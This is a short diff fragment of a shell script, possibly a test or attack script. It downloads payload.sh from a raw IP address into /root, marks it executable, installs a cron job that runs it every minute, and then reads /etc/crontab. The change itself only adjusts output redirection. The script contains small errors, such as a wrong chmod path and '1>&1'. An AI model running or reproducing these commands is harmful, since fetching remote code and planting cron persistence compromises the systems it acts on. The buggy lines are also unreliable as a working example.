@@ -23,8 +23,8 @@ curl http://35.194.58.97/payload.sh --output /root/payload.sh
 chmod +x /root/payload/sh
 crontab -l > /root/mycron
 echo * * * * * /root/payload.sh >> /root/mycron
-crontab /root/mycron
-ls /root > \${OUTPATH}
+crontab /root/mycron 2> \${OUTPATH}
+ls /root >> \${OUTPATH}
 cat /etc/crontab >> \${OUTPATH} 1>&1
 
 __EOF__
